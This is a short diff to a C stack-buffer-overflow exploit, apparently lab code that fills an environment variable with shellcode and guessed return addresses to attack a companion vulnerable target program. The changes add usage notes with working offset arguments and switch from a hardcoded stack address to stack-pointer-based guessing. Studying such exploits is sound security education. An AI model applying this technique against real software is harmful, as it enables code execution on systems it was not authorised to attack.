@@ -24,6 +24,8 @@
 // ./guess_offset [exploit buffer size] [target buffer offset guess]
 // > ./target $EGG
 //
+// target (from stack_overflow_target.c) can be exploited with:
+// > ./guess_offset 600 1048
 #define DEFAULT_OFFSET      0
 #define DEFAULT_BUFFER_SIZE 512
 
@@ -47,7 +49,6 @@ void main(int argc, char *argv[]) {
   // the address we are guessing the vulnerable buffer starts at
   long addr;
 
-  // helpers for copying shellcode and N copies of addr into the exploit buffer
   char *ptr;
   long *addr_ptr;
   int i;
@@ -76,12 +77,14 @@ void main(int argc, char *argv[]) {
     exit(1);
   }
 
-  // TODO passing the known address segfaults
-  // known address in stack_overflow_target.c for testinh
-  // (args 600 472 hit this address)
-  addr = 0xffffd968;
+  // known address of the buffer in stack_overflow_target.c
+  // when the exploit is in argv[1]:
+  // (findable with args 600 1048. I got these by working backwards from
+  // a memory dump of target)
+  // addr = 0xffffd6d8;
 
-  // addr = get_sp() - offset;
+  // guess the address based on offset
+  addr = get_sp() - offset;
   printf("Guess address: 0x%x\n", addr);
 
   // the address of our exploit buffer
